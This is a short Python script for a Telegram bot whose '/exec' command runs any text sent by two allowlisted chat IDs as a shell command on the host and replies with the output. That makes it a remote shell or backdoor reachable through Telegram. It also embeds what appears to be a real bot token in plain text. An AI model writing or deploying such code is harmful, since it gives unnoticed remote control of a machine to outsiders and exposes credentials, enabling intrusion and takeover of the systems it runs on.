import telebot
import subprocess
token = "6829754517:AAGKEhV2_PsQ99DaLPSYFPrZMXNhzCqJAdM"

bot = telebot.TeleBot(token)

@bot.message_handler(commands=['exec'])
def execute_command(message):
    print (message.chat.id)
    if (message.chat.id == 650550237 or message.chat.id == 5026461524):
        try:
            result = subprocess.getoutput(message.text[6:])
            bot.reply_to(message, "Result:\n" + result)
        except Exception as e:
            bot.reply_to(message, "An error occurred:\n" + str(e))
    else:
        bot.reply_to("id !=")
    

bot.polling()